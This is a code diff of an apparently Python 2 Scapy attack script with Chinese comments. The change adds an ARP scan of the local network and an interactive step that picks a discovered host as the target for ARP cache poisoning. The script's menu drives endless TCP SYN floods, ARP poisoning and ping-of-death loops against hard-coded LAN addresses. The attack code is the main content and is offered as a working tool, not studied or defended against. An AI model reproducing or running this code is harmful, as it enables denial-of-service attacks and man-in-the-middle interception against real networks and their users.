@@ -62,15 +62,28 @@ def send_arp_probe():
      
     #将需要的IP地址和Mac地址存放在result列表中
     result=[]
+    ipList=[]
     for s,r in ans:
         #解析收到的包，提取出需要的IP地址和MAC地址
         result.append([r[ARP].psrc,r[ARP].hwsrc])
+    for s,r in ans:
+        ipList.append(r[ARP].psrc)
     #将获取的信息进行排序，看起来更整齐一点
     result.sort()
     #打印出局域网中的主机
     for ip,mac in result:
         print(ip,'------>',mac)
-    
+    for i in range(0,len(ipList)):
+        print("choose %d "%i,ipList[i])
+    print'\n the number must between 0 and ',(len(ipList)-1)
+    choseNumber=int(input("\nPlease input the number that you choose:"))
+    if  choseNumber<len(ipList):
+        AttackAddr = ipList[choseNumber]
+        send_arp_cache_poison(AttackAddr,"192.168.0.10","192.168.0.1")
+    else:
+        print 'The number you choose is invalid'
+
+
 def main():
     while True:
         print"1.tcp_syn 2.arp_cache_poison 3.ping of death 4.arp_probe\n"
@@ -78,14 +91,14 @@ def main():
         if num == 1:
             while 1:
                 send_tcp_syn_packet("192.168.100.1",22)
-        if num == 2:
-            send_arp_cache_poison("192.168.0.106","192.168.0.10","192.168.0.1")
-        if num == 3:
+        elif num == 2:
+            send_arp_cache_poison("192.168.0.101","192.168.0.10","192.168.0.1")
+        elif num == 3:
             while 1:
                 send_ping_of_death("192.168.0.103")
-        if num == 4:
+        elif num == 4:
             send_arp_probe()
-        if num == 9:
+        elif num == 9:
             break
         else: 
             print"The operation is not exist!\n"
